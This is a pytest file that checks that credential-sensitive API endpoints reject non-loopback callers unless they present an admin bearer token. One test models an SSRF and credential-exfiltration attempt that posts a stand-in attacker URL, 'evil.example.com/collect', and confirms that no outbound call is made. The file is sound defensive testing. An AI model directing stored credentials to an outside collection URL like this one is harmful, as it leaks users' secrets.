"""Admin-auth guard on every credential-sensitive endpoint (Mission 025).

Every endpoint that reads/writes uses a stored credential, or forwards a
client-supplied URL to a server outbound request must be reachable only from
loopback (when no LLM_COUNCIL_ADMIN_TOKEN is set) or with the bearer token.

These tests prove, for endpoints newly guarded in Mission 025:

  A. non-loopback + no token -> 401 or 403 (rejected before the handler body);
  B. loopback + no token -> reaches the handler (regression for local use);
  C. non-loopback + correct bearer token -> reaches the handler;
  D. the test-custom-endpoint SSRF/credential path is rejected before any
     outbound call is attempted.
"""

from unittest.mock import AsyncMock, patch

import pytest
from fastapi.testclient import TestClient

from backend.credentials import file_backend, store


NON_LOOPBACK = "203.0.113.10"
LOOPBACK = "127.0.0.1"


@pytest.fixture()
def cred_file(tmp_path, monkeypatch):
    path = tmp_path / "credentials.json"
    monkeypatch.setattr(file_backend, "CREDENTIALS_FILE", path)
    monkeypatch.setattr(store, "get_effective_mode", lambda: "file")
    monkeypatch.setattr(store, "_preferred_mode", lambda: "file")
    monkeypatch.setattr(store, "ENV_OVERRIDES", {})
    return path


# ---------------------------------------------------------------------------
# Newly-guarded endpoints under test (all added dependencies[Depends(_require_admin)]).
# ---------------------------------------------------------------------------

# (method, path, minimal valid body)
NEWLY_GUARDED = [
    ("put", "/api/settings", {"search_keyword_extraction": "llm"}),
    ("post", "/api/settings/credential-storage", {"mode": "file"}),
    ("post", "/api/oauth/xai-oauth/start", None),
    ("get", "/api/oauth/xai-oauth/status", None),
    ("delete", "/api/oauth/xai-oauth", None),
    ("get", "/api/credentials/import/relay-ai/discover", None),
    ("post", "/api/credentials/import/relay-ai", {"ids": [], "replace_existing": False}),
    ("get", "/api/models/direct", None),
    ("post", "/api/settings/test-tavily", {"api_key": ""}),
    ("post", "/api/settings/test-brave", {"api_key": ""}),
    ("post", "/api/settings/test-serper", {"api_key": ""}),
    ("post", "/api/settings/test-tinyfish", {"api_key": ""}),
    ("post", "/api/settings/test-provider", {"provider_id": "anthropic", "api_key": ""}),
    ("post", "/api/settings/test-opencode", {"api_key": ""}),
    ("get", "/api/ollama/tags", None),
    ("post", "/api/settings/test-ollama", {"base_url": "http://127.0.0.1:11434"}),
    ("post", "/api/settings/test-custom-endpoint", {"name": "x", "url": "http://127.0.0.1:9999/v1"}),
    ("post", "/api/settings/test-openrouter", {"api_key": ""}),
    ("get", "/api/custom-endpoint/models", None),
    ("get", "/api/models", None),
]


def _do(client, method, path, body):
    if body is None:
        return client.request(method, path)
    return client.request(method, path, json=body)


# ---------------------------------------------------------------------------
# A. Non-loopback unauth requests are rejected (401 or 403) before the handler.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("method,path,body", NEWLY_GUARDED)
def test_newly_guarded_endpoint_rejects_non_loopback_without_token(
    cred_file, method, path, body
):
    """Without a token, a non-loopback caller cannot reach these endpoints."""
    from backend.main import app

    with TestClient(app, client=(NON_LOOPBACK, 50000)) as c:
        resp = _do(c, method, path, body)
    assert resp.status_code in (401, 403), (
        f"{method.upper()} {path} allowed non-loopback unauth "
        f"(got {resp.status_code})"
    )


# ---------------------------------------------------------------------------
# B. Loopback + no token still reaches the handler (regression, local use).
# ---------------------------------------------------------------------------

# For loopback success we only assert the endpoint is NOT rejected (i.e. the
# guard passes). We avoid triggering real outbound/credential side effects by
# mocking the handler bodies we do not intend to execute for real.


def test_loopback_put_settings_survives_with_updated_font_size(cred_file, monkeypatch):
    """Loopback no-token PUT /api/settings passes the guard (local Settings write)."""
    monkeypatch.setattr(store, "_disabled_secret_ids", lambda: set())
    from backend.main import app

    with patch("backend.main.update_settings") as mock_update, \
         patch("backend.main.build_settings_response") as mock_resp:
        class FakeSettings:
            search_keyword_extraction = "llm"
        mock_update.return_value = FakeSettings()
        mock_resp.return_value = {"search_keyword_extraction": "llm", "ok": True}
        with TestClient(app, client=(LOOPBACK, 50000)) as c:
            resp = c.put("/api/settings", json={"search_keyword_extraction": "llm"})
    assert resp.status_code == 200
    mock_update.assert_called_once()


def test_loopback_test_custom_endpoint_passes_guard(cred_file):
    """Loopback no-token test-custom-endpoint passes the guard (Local Settings test)."""
    from backend.main import app
    from backend.providers.custom_openai import CustomOpenAIProvider

    with patch.object(
        CustomOpenAIProvider, "validate_connection", new_callable=AsyncMock
    ) as mock_validate:
        mock_validate.return_value = {"success": True, "message": "ok"}
        with TestClient(app, client=(LOOPBACK, 50000)) as c:
            resp = c.post(
                "/api/settings/test-custom-endpoint",
                json={"name": "x", "url": "http://127.0.0.1:9999/v1"},
            )
    assert resp.status_code == 200
    mock_validate.assert_awaited()


# ---------------------------------------------------------------------------
# C. Non-loopback with correct bearer token succeeds.
# ---------------------------------------------------------------------------


def test_non_loopback_with_admin_token_reaches_put_settings(cred_file, monkeypatch):
    """With LLM_COUNCIL_ADMIN_TOKEN set, the bearer token grants remote access."""
    import backend.main as main

    # _require_admin reads _ADMIN_TOKEN from module globals at call time; we can
    # set it directly without reloading the module (reload would break other
    # tests that import names from backend.main at module scope).
    monkeypatch.setattr(main, "_ADMIN_TOKEN", "test-token-xyz")
    monkeypatch.setattr(store, "_disabled_secret_ids", lambda: set())
    with patch("backend.main.update_settings") as mock_update, \
         patch("backend.main.build_settings_response") as mock_resp:
        class FakeSettings:
            search_keyword_extraction = "llm"
        mock_update.return_value = FakeSettings()
        mock_resp.return_value = {"search_keyword_extraction": "llm", "ok": True}
        with TestClient(main.app, client=(NON_LOOPBACK, 50000)) as c:
            resp = c.put(
                "/api/settings",
                json={"search_keyword_extraction": "llm"},
                headers={"Authorization": "Bearer test-token-xyz"},
            )
    assert resp.status_code == 200
    mock_update.assert_called_once()


def test_non_loopback_with_wrong_token_rejected(cred_file, monkeypatch):
    """A wrong bearer token is still rejected even if the peer is non-loopback."""
    import backend.main as main

    monkeypatch.setattr(main, "_ADMIN_TOKEN", "test-token-xyz")
    with patch("backend.main.update_settings") as mock_update:
        with TestClient(main.app, client=(NON_LOOPBACK, 50000)) as c:
            resp = c.put(
                "/api/settings",
                json={"search_keyword_extraction": "llm"},
                headers={"Authorization": "Bearer wrong-token"},
            )
    assert resp.status_code == 401
    mock_update.assert_not_called()


# ---------------------------------------------------------------------------
# D. test-custom-endpoint SSRF/credential path is blocked BEFORE any outbound call.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "host,status",
    [
        (NON_LOOPBACK, (401, 403)),
        (LOOPBACK, 200),
    ],
)
def test_test_custom_endpoint_arbitrary_url_and_omitted_key(cred_file, host, status):
    """Arbitrary URL + omitted key: non-loopback never reaches the provider.

    The server must reject (401/403) BEFORE any call to
    CustomOpenAIProvider.validate_connection, proving the SSRF/credential-
    exfiltration request is never issued. A loopback peer is allowed to reach
    the provider (local test), but even that path must not leak the key.
    """
    from backend.main import app
    from backend.providers.custom_openai import CustomOpenAIProvider

    with patch.object(
        CustomOpenAIProvider, "validate_connection", new_callable=AsyncMock
    ) as mock_validate:
        mock_validate.return_value = {"success": True, "message": "ok"}
        with TestClient(app, client=(host, 50000)) as c:
            resp = c.post(
                "/api/settings/test-custom-endpoint",
                json={"name": "attacker", "url": "https://evil.example.com/collect"},
            )

    if status == (401, 403):
        assert resp.status_code in status
        mock_validate.assert_not_awaited(), (
            "outbound validate_connection was called for a rejected non-loopback request"
        )
    else:
        assert resp.status_code == 200


def test_discover_relay_ai_blocked_for_non_loopback(cred_file):
    """Credential discovery reads the OS keystore; non-loopback must be blocked."""
    from backend.main import app
    from backend.credentials import relay_import

    with patch.object(
        relay_import, "discover_relay_ai_credentials", return_value={"items": []}
    ) as mock_discover:
        with TestClient(app, client=(NON_LOOPBACK, 50000)) as c:
            resp = c.get("/api/credentials/import/relay-ai/discover")
        mock_discover.assert_not_called()
    assert resp.status_code in (401, 403)
